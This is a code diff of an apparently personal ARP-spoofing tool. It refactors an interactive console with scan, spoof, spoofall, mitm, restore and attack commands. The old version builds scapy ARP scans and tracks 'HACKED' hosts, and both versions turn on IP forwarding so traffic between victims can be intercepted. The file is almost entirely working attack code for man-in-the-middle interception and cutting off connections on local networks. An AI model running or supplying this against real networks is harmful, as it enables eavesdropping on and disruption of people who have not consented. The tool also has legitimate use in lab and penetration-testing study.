@@ -1,214 +1,85 @@
-from pwn import log
-from scapy.all import *
-import sys
-import argparse
-from tabulate import tabulate
-from tables.tables import *
-import os, socket
-
-import netifaces
-
-print("""
-
-
-|-----------------------------------------------------------------------|
-||                                                                     ||
-||       _    ____  ____  ____  ____   ___   ___  _____ _____ ____     ||
-||      / \  |  _ \|  _ \/ ___||  _ \ / _ \ / _ \|  ___| ____|  _ \    ||
-||     / _ \ | |_) | |_) \___ \| |_) | | | | | | | |_  |  _| | |_) |   ||
-||    / ___ \|  _ <|  __/ ___) |  __/| |_| | |_| |  _| | |___|  _ <    ||
-||   /_/   \_|_| \_|_|   |____/|_|    \___/ \___/|_|   |_____|_| \_\   ||
-||                                                                     ||
-||                                                                     ||
-||   By: xalvarex                                                      ||
-||   Github: https://github.com/xalvarex/                              ||
-||                                                                     || 
-|-----------------------------------------------------------------------|
-
-
-arpscan --network 192.168.0.0/24                (Scan the provided network)
-hosts                                           (Show the hosts found)
-arptable --target 192.168.0.2                   (Show arp table of target)
-spoof --target 192.168.0.3                      (Spoof arp table of target)
-mitm --target 192.168.0.3 192.168.0.1           (Intercept trafic between 2 targets)
-spoofall                                        (Spoof arp tables of all hosts)
-restore                                         (Restore all arp tables)
-
-attack                                          (Apply arp tables and execute attack)
-
-""")
-
-host_list = []
-    
-arptables = {}
-adapter = False
-    
+from arptables.ArpTable import ArpTable
+import os
 
 
 
-def arp_scan(network):
-    
-    hosts_up = []
-
-    conf.verb = 0
-    
-    print("Scanning network (ARP)...")
-    
-    up, down = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = network), timeout = 3, iface = adapter, inter = 0.1)
-
-    for snd,rcv in up:
-        IP = str(rcv).split(' ')[7]
-        MAC = str(rcv).split(' ')[5]
-        hosts_up.append([IP, MAC, False])
-    
-    
-    
-    hosts_up.append([attacker_addr[0], attacker_addr[1], "own"])
-        
-            
-    return hosts_up
-        
-    
-  
-def show_hosts(host_list):
-    
-    header = ["IP", "MAC", "HACKED"]
-
-    print(tabulate(host_list, headers = header,  tablefmt="grid"))
-       
-
-        
-
-        
-
-adapter = sys.argv[1]
-
-attacker_ip = netifaces.ifaddresses(adapter)[2][0]["addr"]    
-attacker_mac = netifaces.ifaddresses(adapter)[17][0]["addr"]
-attacker_addr = [attacker_ip, attacker_mac]
-
-        
-        
-while adapter:
-
-    #Read input user
-    args = input("\n\n> ").strip().split(' ')
-
-    arg_parser = argparse.ArgumentParser(usage ="""
-
-    arpscan --network 192.168.0.0/24                (Scan the provided network)
-    hosts                                           (Show the hosts found)
-    arptable --target 192.168.0.2                   (Show arp table of 1 target before exec attack)
-    spoof --target 192.168.0.3                      (Spoof arp table of 1 target)
-    mitm -t 192.168.0.3 -t2 192.168.0.1             (Intercept trafic between 2 targets)
-    spoofall                                        (Spoof arp tables of all hosts)
-    restore                                         (Restore all arp tables)
-
-    attack (--noforward)                            (Apply arp tables and execute attack)
-    """)
+#Dictionary to save all the objects, the Key of each object will be the IP of the victim table
+victims = {}
 
 
-    arg_parser.add_argument("action", help="arpscan, hosts, arptable, spoof, mitm, attack")
-    arg_parser.add_argument("-t", "--target")
-    arg_parser.add_argument("-t2", "--target2")
-    arg_parser.add_argument("-n", "--network")
-    arg_parser.add_argument("-nf", "--noforward", action="store_true", help="(Disable forwarding packets to the victims. Useful to cut victim connection)")
+while True:
+
+    cmd = input('> ').split(' ')
+
+    if cmd[0] == 'scan':
+
+        print("Scanning network " + cmd[1])
+        ArpTable.arpscan(cmd[1])
+
+        #Create a object for each victim except attacker
+        for victim in ArpTable.table:
+            if victim[0] != ArpTable.IP:
+                victims[victim[0]] = ArpTable()
+                victims[victim[0]].IP = victim[0]
+                victims[victim[0]].MAC = victim[1]
 
 
-    
-    try: 
-        args = arg_parser.parse_args(args)
-        action = args.action
-        target_ip = args.target
-        target_ip2 = args.target2
-        network = args.network
-    except:
-        print(args)
-        print("Invalid arguments")
+
+    if ArpTable.table == []:
+        print("Scan the network before " + cmd[0])
         continue
-      
 
+
+    if cmd[0] == 'hosts':
+        ArpTable.show(ArpTable)
+
+
+    if cmd[0] == 'arptable':
+        victims[cmd[1]].show()
+
+
+    if cmd[0] == 'spoof':
+        victims[cmd[1]].spoof_row()
+
+
+    if cmd[0] == 'fullspoof':
+        victims[cmd[1]].spoofall()
+
+
+    if cmd[0] == 'spoofall':
+        for victim in victims:
+            victims[victim].spoofall()   
+
+
+    if cmd[0] == 'mitm':
         
-    if action == "arpscan":
-        host_list = arp_scan(network)
-        show_hosts(host_list)
-        
-        for addr in host_list:
-            arptables[addr[0]] = arptable(copy.deepcopy(host_list), copy.deepcopy(addr), attacker_addr)
+        victims[cmd[1]].spoof(cmd[2])
+        victims[cmd[2]].spoof(cmd[1])
 
-        
-    if action == "hosts":
-        show_hosts(host_list)
-    
-    if action == "spoof":
-        for addr in host_list:
-            if addr[0] == target_ip:
-                addr[2] = True
 
-        arptables[target_ip].spoof_v()
+    if cmd[0] == 'restore':
 
-    if action == "arptable":
-        arptables[target_ip].show()
+        if cmd[1] == "all":
+            for victim in victims:
+                victims[victim].restore()
 
-    if action == "mitm":
-
-        for addr in host_list:
-            if addr[0] == target_ip:
-                addr[2] = True
-            if addr[0] == target_ip2:
-                addr[2] = True
-
-        arptables[target_ip].spoof(target_ip2)
-        arptables[target_ip2].spoof(target_ip)
-
-    if action == "spoofall":
-        for addr in host_list:
-            addr[2] = True
-            arptables[addr[0]].spoofall()
-
-    if action == "restore":
-        for addr in host_list:
-            addr[2] = False
-            arptables[addr[0]].restore(copy.deepcopy(host_list))
-        
-            
-
-    if action == "attack":
-        
-        if args.noforward == False:
-            os.system("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
-            print("Forwarding packets enabled")
         else:
-            os.system("echo 0 | tee /proc/sys/net/ipv4/ip_forward")
-            print("Forwarding packets disabled")
-        
-        for addr in host_list:
-            arptables[addr[0]].attack()
+            victims[cmd[1]].restore()
 
 
-    if action == "exit":
+    if cmd[0] == 'attack':
+        os.system("echo 1 | tee /proc/sys/net/ipv4/ip_forward")
+        print("Forwarding packets enabled")
+
+        for victim in victims:
+            victims[victim].attack()
+
+
+    if cmd[0] == 'exit':
         os.system("echo 0 | tee /proc/sys/net/ipv4/ip_forward")
-        for addr in host_list:
-            arptables[addr[0]].restore(copy.deepcopy(host_list))
-        for addr in host_list:
-            arptables[addr[0]].attack()
-
-        print("Exiting and restoring tables")
         break
 
 
-    
-        
-
-
-
-
-
-
-
-
-    
-
 
 
 
@@ -218,45 +89,12 @@ while adapter:
     
 
     
-        
-
-
-
-
-    
-    
-
 
     
 
-    
-        
-   
-
-        
-
-        
-
-        
-
-        
-        
-
-        
-        
-
-        
-
-        
-        
-
-
-        
 
 
 
 
 
-    
-            
 
